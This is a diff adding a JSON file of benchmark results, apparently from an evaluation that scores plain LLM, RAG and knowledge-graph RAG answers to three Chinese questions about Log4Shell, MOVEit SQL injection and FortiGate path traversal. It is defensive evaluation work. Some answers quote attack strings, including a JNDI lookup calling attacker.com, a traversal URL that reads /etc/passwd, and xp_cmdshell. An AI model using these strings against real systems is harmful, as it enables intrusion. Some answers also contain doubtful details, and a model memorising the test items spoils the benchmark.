@@ -1,0 +1,327 @@
+[
+  {
+    "id": "eval-log4shell",
+    "question": "Log4Shell 漏洞的攻击原理和防护措施是什么？",
+    "reference_answer": "Log4Shell 是 Apache Log4j2 的 JNDI 远程代码执行漏洞，攻击者可通过可控日志内容触发远程查找并执行代码。防护重点包括升级 Log4j2、移除或禁用高风险组件、限制 LDAP/RMI 出站访问并监控异常 JNDI 请求。",
+    "expected_entities": [
+      "CVE-2021-44228",
+      "CWE-502",
+      "T1190",
+      "MIT-001",
+      "MIT-004",
+      "MIT-009"
+    ],
+    "expected_relations": [
+      "AFFECTS_PRODUCT",
+      "HAS_WEAKNESS",
+      "USES_TECHNIQUE",
+      "HAS_MITIGATION"
+    ],
+    "expected_keywords": [
+      "Log4Shell",
+      "Log4j",
+      "JNDI",
+      "LDAP",
+      "远程代码执行",
+      "升级",
+      "监控"
+    ],
+    "best_mode": "KG-RAG",
+    "results": [
+      {
+        "mode": "普通 LLM",
+        "final_score": 0.4417,
+        "entity_hit_rate": 0.1667,
+        "relation_hit_rate": 0.0,
+        "keyword_coverage": 1.0,
+        "evidence_score": 0.0,
+        "confidence": 0.45,
+        "elapsed_ms": 8082,
+        "graph_path_count": 0,
+        "text_evidence_count": 0,
+        "observed_entities": [
+          "CVE-2021-44228"
+        ],
+        "observed_relations": [],
+        "answer": "结论：Log4Shell（CVE-2021-44228）是Apache Log4j2日志库中的一个严重远程代码执行漏洞，攻击者可通过构造恶意日志消息触发JNDI注入，实现任意代码执行。防护措施包括升级版本、配置参数和网络层拦截。\n\n原理分析：\n1. 漏洞根因：Log4j2支持JNDI（Java命名和目录接口）查找功能，当日志消息中包含特定格式的字符串（如`${jndi:ldap://attacker.com/a}`）时，Log4j2会解析该字符串并执行JNDI查询。\n2. 攻击流程：攻击者向目标应用发送包含恶意JNDI字符串的请求（如HTTP头、用户输入等），应用记录日志时触发解析。Log4j2通过JNDI连接到攻击者控制的LDAP服务器，服务器返回恶意Java类，目标应用加载并执行该类，导致远程代码执行。\n3. 影响范围：Log4j2版本2.0至2.14.1受影响，广泛用于Apache Struts、Spring Boot等框架。\n\n防护建议：\n1. 升级版本：立即升级Log4j2至2.17.0及以上（Java 8+）或2.12.4（Java 7），或使用Logback替代。\n2. 配置缓解：设置系统属性`log4j2.formatMsgNoLookups=true`，或移除JndiLookup类（如`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`）。\n3. 网络防护：在WAF或防火墙中拦截包含`${jndi:`、`${ldap:`等模式的请求，并限制出站LDAP/RMI连接。\n4. 监控检测：检查日志中是否存在异常JNDI字符串，使用漏洞扫描工具确认受影响组件。\n\n注意：若问题涉及特定环境（如Java版本、Log4j2具体版本），需进一步确认兼容性。"
+      },
+      {
+        "mode": "普通 RAG",
+        "final_score": 0.4783,
+        "entity_hit_rate": 0.1667,
+        "relation_hit_rate": 0.0,
+        "keyword_coverage": 0.8571,
+        "evidence_score": 0.625,
+        "confidence": 0.65,
+        "elapsed_ms": 4790,
+        "graph_path_count": 0,
+        "text_evidence_count": 5,
+        "observed_entities": [
+          "CAPEC-650",
+          "CVE-2021-44228",
+          "CVE-2022-1388",
+          "CWE-79",
+          "CWE-89"
+        ],
+        "observed_relations": [],
+        "answer": "结论：当前证据不足，无法完整回答Log4Shell漏洞的攻击原理和防护措施。\n\n证据依据：\n- 文本证据中仅有一条与Log4Shell直接相关（来源：Security Advisory；实体：CVE-2021-44228；相关度：0.03），内容为：“Log4Shell 缓解措施包括升级 Log4j2、移除 JndiLookup、限制出站 LDAP/RMI 访问并监控异常 JNDI 字符串。” 该证据仅提供了部分防护措施，未涉及攻击原理。\n- 其他证据（如CWE-79、CAPEC-650、CVE-2022-1388、CWE-89）均与Log4Shell无关，相关度极低（0.04-0.05），不能作为回答依据。\n\n防护建议：\n- 基于现有证据，可采取的防护措施包括：升级Log4j2至安全版本、移除JndiLookup类、限制出站LDAP/RMI访问、监控异常JNDI字符串。\n- 如需了解攻击原理，建议查询CVE-2021-44228的详细技术分析，或搜索“Log4Shell JNDI注入”相关文档。"
+      },
+      {
+        "mode": "KG-RAG",
+        "final_score": 0.825,
+        "entity_hit_rate": 0.5,
+        "relation_hit_rate": 0.75,
+        "keyword_coverage": 1.0,
+        "evidence_score": 1.0,
+        "confidence": 0.8,
+        "elapsed_ms": 7125,
+        "graph_path_count": 12,
+        "text_evidence_count": 5,
+        "observed_entities": [
+          "CAPEC-586",
+          "CAPEC-650",
+          "CVE-2018-13379",
+          "CVE-2019-19781",
+          "CVE-2021-34473",
+          "CVE-2021-44228",
+          "CVE-2022-1388",
+          "CVE-2022-22965",
+          "CVE-2023-34362",
+          "CVE-2023-3519",
+          "CWE-502",
+          "CWE-79",
+          "CWE-89",
+          "PROD-LOG4J",
+          "T1190",
+          "TA0001"
+        ],
+        "observed_relations": [
+          "AFFECTS_PRODUCT",
+          "BELONGS_TO_TACTIC",
+          "HAS_WEAKNESS",
+          "RELATED_TO_CAPEC",
+          "USES_TECHNIQUE"
+        ],
+        "answer": "结论：Log4Shell 漏洞（CVE-2021-44228）的攻击原理是利用Apache Log4j2的JNDI注入功能，通过构造恶意字符串触发远程代码执行；防护措施包括升级Log4j2版本、移除JndiLookup类、限制出站LDAP/RMI访问及监控异常JNDI字符串。\n\n证据依据：\n- 攻击原理：图谱证据显示CVE-2021-44228关联CWE-502（反序列化漏洞），并通过CAPEC-586（对象注入攻击）和T1190（利用面向公众的应用程序漏洞）实现攻击，属于TA0001（初始访问）战术。文本证据5指出攻击通过JNDI注入触发，与CWE-502和CAPEC-586一致。\n- 防护措施：文本证据5明确列出缓解措施，包括升级Log4j2、移除JndiLookup、限制出站LDAP/RMI访问并监控异常JNDI字符串。图谱证据未直接提供防护信息，但文本证据5是唯一相关来源。\n\n防护建议：\n1. 立即升级Apache Log4j2至2.17.0及以上版本，或应用官方补丁。\n2. 移除或禁用JndiLookup类（如设置系统属性`log4j2.enableJndiLookup=false`）。\n3. 在网络层面限制出站LDAP（389/TCP）和RMI（1099/TCP）访问，仅允许必要通信。\n4. 部署Web应用防火墙（WAF）规则，监控并拦截包含`${jndi:`等异常JNDI字符串的请求。\n5. 定期扫描系统日志，检测是否存在JNDI注入尝试（如`${jndi:ldap://`或`${jndi:rmi://`模式）。"
+      }
+    ]
+  },
+  {
+    "id": "eval-moveit",
+    "question": "MOVEit SQL 注入漏洞会关联哪些攻击技术和防护措施？",
+    "reference_answer": "MOVEit Transfer SQL 注入漏洞可导致未授权访问、数据窃取，并可能关联公网应用利用和工具传输等攻击技术。缓解方式包括安装补丁、加强输入校验和监控异常数据访问。",
+    "expected_entities": [
+      "CVE-2023-34362",
+      "CWE-89",
+      "T1190",
+      "T1105",
+      "MIT-001",
+      "MIT-002",
+      "MIT-009"
+    ],
+    "expected_relations": [
+      "AFFECTS_PRODUCT",
+      "HAS_WEAKNESS",
+      "USES_TECHNIQUE",
+      "HAS_MITIGATION"
+    ],
+    "expected_keywords": [
+      "MOVEit",
+      "SQL 注入",
+      "未授权",
+      "数据窃取",
+      "工具传输",
+      "输入校验",
+      "补丁"
+    ],
+    "best_mode": "KG-RAG",
+    "results": [
+      {
+        "mode": "普通 LLM",
+        "final_score": 0.2072,
+        "entity_hit_rate": 0.1429,
+        "relation_hit_rate": 0.0,
+        "keyword_coverage": 0.4286,
+        "evidence_score": 0.0,
+        "confidence": 0.45,
+        "elapsed_ms": 9056,
+        "graph_path_count": 0,
+        "text_evidence_count": 0,
+        "observed_entities": [
+          "CVE-2023-34362"
+        ],
+        "observed_relations": [],
+        "answer": "结论：MOVEit SQL注入漏洞（如CVE-2023-34362）主要关联SQL注入攻击技术，并常被用于数据窃取、权限提升和后续横向移动。防护措施需从代码层、配置层和监控层综合实施。\n\n原理分析：  \n1. **攻击技术关联**：  \n   - **SQL注入**：攻击者通过构造恶意SQL语句（如利用未过滤的输入参数），绕过身份验证或执行任意数据库操作（如`UNION SELECT`窃取数据、`xp_cmdshell`执行系统命令）。  \n   - **权限提升**：利用数据库高权限账户（如`sa`）或存储过程漏洞，获取系统级控制权。  \n   - **横向移动**：通过窃取的数据库凭证或Web shell，进一步攻击内网其他服务（如SSH、RDP）。  \n   - **数据外传**：结合加密通道（如HTTPS）或DNS隧道，隐蔽传输窃取的数据。  \n\n2. **漏洞成因**：  \n   - 用户输入未严格过滤（如未使用参数化查询）。  \n   - 数据库账户权限过高（如使用`db_owner`角色）。  \n   - 缺乏输入验证（如未限制特殊字符`'`、`--`等）。  \n\n防护建议：  \n1. **代码层**：  \n   - 使用参数化查询（如PreparedStatement）或ORM框架（如Hibernate）替代拼接SQL。  \n   - 对用户输入进行白名单验证（如仅允许字母数字字符）。  \n\n2. **配置层**：  \n   - 最小化数据库账户权限（如仅授予`SELECT`、`INSERT`等必要权限）。  \n   - 禁用危险存储过程（如`xp_cmdshell`）。  \n   - 部署Web应用防火墙（WAF）拦截SQL注入特征（如`OR 1=1`）。  \n\n3. **监控与响应**：  \n   - 启用数据库审计日志，监控异常查询（如大量`UNION`操作）。  \n   - 定期扫描漏洞（如使用SQLMap模拟攻击测试）。  \n   - 实施入侵检测系统（IDS）识别SQL注入流量模式。  \n\n注意：若未明确MOVEit版本或攻击上下文（如是否涉及第三方组件），需进一步确认漏洞具体利用条件（如是否需要认证）。"
+      },
+      {
+        "mode": "普通 RAG",
+        "final_score": 0.2795,
+        "entity_hit_rate": 0.2857,
+        "relation_hit_rate": 0.0,
+        "keyword_coverage": 0.2857,
+        "evidence_score": 0.625,
+        "confidence": 0.65,
+        "elapsed_ms": 5044,
+        "graph_path_count": 0,
+        "text_evidence_count": 5,
+        "observed_entities": [
+          "CAPEC-126",
+          "CVE-2019-19781",
+          "CVE-2022-22965",
+          "CVE-2023-34362",
+          "MIT-010",
+          "T1190",
+          "T1505.003"
+        ],
+        "observed_relations": [],
+        "answer": "结论：当前证据不足，无法直接回答MOVEit SQL注入漏洞关联的攻击技术和防护措施。文本证据中未提及MOVEit、SQL注入漏洞及其具体关联内容。\n\n证据依据：\n- 文本证据1（CVE-2022-22965）涉及Spring4Shell远程代码执行，与MOVEit无关。\n- 文本证据2（CAPEC-126）描述路径遍历攻击，非SQL注入。\n- 文本证据3（MIT-010）提供密码轮换等通用防护，未针对SQL注入。\n- 文本证据4（CVE-2019-19781）为Citrix路径遍历漏洞，不相关。\n- 文本证据5（T1505.003）涉及Web Shell部署，未关联SQL注入。\n\n防护建议：\n- 建议查询MOVEit官方安全公告或CVE数据库（如CVE-2023-34362）获取SQL注入漏洞详情。\n- 可搜索MITRE ATT&CK中SQL注入相关技术（如T1190 Exploit Public-Facing Application）及OWASP SQL注入防护指南。\n- 如需进一步分析，请提供MOVEit SQL注入漏洞的具体CVE编号或相关文本证据。"
+      },
+      {
+        "mode": "KG-RAG",
+        "final_score": 0.5786,
+        "entity_hit_rate": 0.4286,
+        "relation_hit_rate": 0.75,
+        "keyword_coverage": 0.4286,
+        "evidence_score": 1.0,
+        "confidence": 0.95,
+        "elapsed_ms": 7259,
+        "graph_path_count": 12,
+        "text_evidence_count": 5,
+        "observed_entities": [
+          "CAPEC-126",
+          "CAPEC-586",
+          "CAPEC-66",
+          "CVE-2018-13379",
+          "CVE-2019-19781",
+          "CVE-2021-34473",
+          "CVE-2021-44228",
+          "CVE-2022-22965",
+          "CVE-2023-34362",
+          "CVE-2023-3519",
+          "CWE-89",
+          "MIT-010",
+          "PROD-MOVEIT",
+          "T1190",
+          "T1505.003",
+          "TA0001"
+        ],
+        "observed_relations": [
+          "AFFECTS_PRODUCT",
+          "BELONGS_TO_TACTIC",
+          "HAS_WEAKNESS",
+          "RELATED_TO_CAPEC",
+          "USES_TECHNIQUE"
+        ],
+        "answer": "结论：MOVEit SQL注入漏洞（CVE-2023-34362）关联的攻击技术包括利用公开漏洞进行初始访问（T1190），防护措施需结合漏洞修复、访问控制和凭证管理。\n\n证据依据：\n- 图谱证据显示，CVE-2023-34362影响产品PROD-MOVEIT，属于CWE-89（SQL注入）弱点，并关联到CAPEC-66（SQL注入攻击模式）。该漏洞使用攻击技术T1190（利用公开漏洞进行初始访问），属于TA0001（初始访问战术）。此外，T1190还被其他多个漏洞（如CVE-2021-44228、CVE-2022-22965等）使用，表明这是一种常见攻击技术。\n- 文本证据中，来源MITRE ATT&CK（相关度0.04）提到T1505.003（Web Shell），攻击者可能在Web服务器上部署远程控制脚本，这可能是SQL注入成功后的后续攻击行为。来源Mitigation Guide（相关度0.04）建议在VPN、管理接口或会话文件存在泄露风险时，及时轮换密码、令牌和会话密钥，这有助于防止凭证被滥用。\n\n防护建议：\n1. **修复漏洞**：立即应用厂商针对CVE-2023-34362的安全补丁，或升级MOVEit软件至不受影响版本。\n2. **输入验证**：实施严格的输入验证和参数化查询，防止SQL注入（对应CWE-89和CAPEC-66）。\n3. **访问控制**：限制对MOVEit管理接口的访问，使用防火墙或VPN隔离，并监控异常登录行为。\n4. **凭证管理**：定期轮换密码、令牌和会话密钥，尤其是当存在泄露风险时（参考MIT-010）。\n5. **检测与响应**：部署Web应用防火墙（WAF）检测SQL注入尝试，并监控Web服务器上是否存在Web Shell（T1505.003）等后门文件。"
+      }
+    ]
+  },
+  {
+    "id": "eval-fortigate",
+    "question": "FortiGate SSL VPN 路径遍历漏洞的风险和处置建议是什么？",
+    "reference_answer": "FortiGate SSL VPN 路径遍历漏洞可能导致敏感会话文件泄露，攻击者可进一步利用泄露凭据登录系统。建议升级修复版本，并对可能泄露的密码、令牌和会话密钥进行轮换。",
+    "expected_entities": [
+      "CVE-2018-13379",
+      "CWE-22",
+      "T1190",
+      "T1078",
+      "MIT-001",
+      "MIT-010"
+    ],
+    "expected_relations": [
+      "AFFECTS_PRODUCT",
+      "HAS_WEAKNESS",
+      "USES_TECHNIQUE",
+      "HAS_MITIGATION"
+    ],
+    "expected_keywords": [
+      "FortiGate",
+      "SSL VPN",
+      "路径遍历",
+      "会话",
+      "凭据",
+      "升级",
+      "轮换"
+    ],
+    "best_mode": "KG-RAG",
+    "results": [
+      {
+        "mode": "普通 LLM",
+        "final_score": 0.3845,
+        "entity_hit_rate": 0.1667,
+        "relation_hit_rate": 0.0,
+        "keyword_coverage": 0.8571,
+        "evidence_score": 0.0,
+        "confidence": 0.45,
+        "elapsed_ms": 8168,
+        "graph_path_count": 0,
+        "text_evidence_count": 0,
+        "observed_entities": [
+          "CVE-2018-13379"
+        ],
+        "observed_relations": [],
+        "answer": "结论：  \nFortiGate SSL VPN 路径遍历漏洞（如CVE-2018-13379等）属于高危漏洞，攻击者可利用该漏洞读取系统敏感文件（如VPN用户密码、会话密钥等），导致未授权访问或数据泄露。需立即采取处置措施。\n\n原理分析：  \n该漏洞源于FortiGate SSL VPN的Web组件对用户输入路径过滤不严。攻击者通过构造特殊URL（如`/remote/fgt_lang?lang=/../../../..//etc/passwd`），绕过目录限制，实现目录遍历，从而读取服务器上的任意文件。部分版本中，攻击者甚至能获取VPN用户凭据或会话令牌，进一步渗透内网。\n\n防护建议：  \n1. **立即升级固件**：将FortiGate设备升级至厂商已修复的版本（如FortiOS 6.0.6及以上、5.6.10及以上），避免使用已停止支持的旧版本。  \n2. **限制访问来源**：在防火墙上配置ACL，仅允许可信IP地址访问SSL VPN服务（默认端口443/TCP）。  \n3. **启用多因素认证**：为VPN用户强制启用双因素认证（如FortiToken），降低凭据泄露风险。  \n4. **监控异常日志**：检查设备日志中是否存在异常路径请求（如包含`../`或`/../../../`的URL），并设置告警规则。  \n5. **临时缓解措施**：若无法立即升级，可禁用SSL VPN的Web管理界面，或通过CLI关闭`fgt_lang`参数处理功能（需参考厂商文档）。  \n6. **定期安全审计**：定期扫描FortiGate设备漏洞，并关注厂商安全公告（如FortiGuard PSIRT）。"
+      },
+      {
+        "mode": "普通 RAG",
+        "final_score": 0.3485,
+        "entity_hit_rate": 0.3333,
+        "relation_hit_rate": 0.0,
+        "keyword_coverage": 0.4286,
+        "evidence_score": 0.625,
+        "confidence": 0.65,
+        "elapsed_ms": 5307,
+        "graph_path_count": 0,
+        "text_evidence_count": 5,
+        "observed_entities": [
+          "CAPEC-66",
+          "CVE-2017-5638",
+          "CVE-2018-13379",
+          "CVE-2019-19781",
+          "CWE-79",
+          "MIT-001"
+        ],
+        "observed_relations": [],
+        "answer": "结论：当前证据不足，无法直接回答FortiGate SSL VPN路径遍历漏洞的具体风险和处置建议。\n\n证据依据：\n- 文本证据中未包含任何直接提及FortiGate SSL VPN路径遍历漏洞（如CVE编号、漏洞描述或相关厂商公告）的内容。\n- 证据1（CAPEC-66）涉及SQL注入，证据2（CVE-2017-5638）涉及Apache Struts2，证据3（MIT-001）为通用补丁建议，证据4（CWE-79）涉及跨站脚本，证据5（CVE-2019-19781）涉及Citrix产品的路径遍历漏洞，均与FortiGate SSL VPN无关。\n- 证据3（MIT-001）虽提供通用缓解措施（及时安装供应商安全补丁），但未针对具体漏洞，无法作为直接处置建议。\n\n防护建议：\n- 建议进一步查询Fortinet官方安全公告或CVE数据库，搜索“FortiGate SSL VPN 路径遍历”或相关CVE编号（如CVE-2018-13379等已知漏洞），以获取具体风险描述和补丁信息。\n- 在获取明确证据前，可参考通用安全实践：及时更新FortiGate固件至最新版本，限制SSL VPN访问来源IP，启用多因素认证，并监控异常登录活动。"
+      },
+      {
+        "mode": "KG-RAG",
+        "final_score": 0.6381,
+        "entity_hit_rate": 0.6667,
+        "relation_hit_rate": 0.75,
+        "keyword_coverage": 0.4286,
+        "evidence_score": 1.0,
+        "confidence": 0.95,
+        "elapsed_ms": 8379,
+        "graph_path_count": 12,
+        "text_evidence_count": 5,
+        "observed_entities": [
+          "CAPEC-126",
+          "CAPEC-586",
+          "CAPEC-66",
+          "CVE-2017-5638",
+          "CVE-2018-13379",
+          "CVE-2019-19781",
+          "CVE-2021-34473",
+          "CVE-2021-44228",
+          "CVE-2022-22965",
+          "CVE-2023-34362",
+          "CWE-22",
+          "CWE-79",
+          "MIT-001",
+          "PROD-FORTIGATE",
+          "T1190",
+          "TA0001"
+        ],
+        "observed_relations": [
+          "AFFECTS_PRODUCT",
+          "BELONGS_TO_TACTIC",
+          "HAS_WEAKNESS",
+          "RELATED_TO_CAPEC",
+          "USES_TECHNIQUE"
+        ],
+        "answer": "结论：FortiGate SSL VPN 路径遍历漏洞（CVE-2018-13379）存在高风险，可能导致未授权访问和代码执行，需立即采取处置措施。\n\n证据依据：\n- 根据图谱证据，CVE-2018-13379 影响 FortiGate 产品（PROD-FORTIGATE），属于路径遍历弱点（CWE-22），并关联到 CAPEC-126（路径遍历攻击模式）。\n- 该漏洞利用技术为 T1190（利用面向公众的应用程序），属于初始访问战术（TA0001），表明攻击者可通过外部网络利用该漏洞获得系统访问权限。\n- 文本证据中，Mitigation Guide（MIT-001）指出“及时安装供应商安全补丁是处理已知 CVE 的首要缓解措施”，但未直接提供 CVE-2018-13379 的补丁信息。其他文本证据（如 CAPEC-66、CVE-2017-5638、CWE-79、CVE-2019-19781）与当前漏洞相关性较低（相关度均低于 0.1），无法直接支撑处置细节。\n\n防护建议：\n1. **立即安装补丁**：访问 Fortinet 官方安全公告，下载并安装针对 CVE-2018-13379 的固件更新或补丁，以修复路径遍历漏洞。\n2. **限制访问**：在未打补丁前，通过防火墙规则或 VPN 策略限制对 FortiGate SSL VPN 接口的访问，仅允许受信任 IP 连接。\n3. **监控异常**：启用日志审计，监控 SSL VPN 登录日志和文件访问记录，排查可疑路径遍历尝试或未授权访问行为。\n4. **加强配置**：禁用不必要的 SSL VPN 功能，并启用多因素认证（MFA）以降低初始访问风险。\n5. **参考官方指南**：查阅 Fortinet 发布的安全响应文档，获取针对 CVE-2018-13379 的详细缓解措施和临时解决方案。\n\n注意：当前证据中未提供 CVE-2018-13379 的具体补丁版本或临时缓解步骤，建议进一步查询 Fortinet 官方安全公告（如 FG-IR-18-384）以获取完整信息。"
+      }
+    ]
+  }
+]
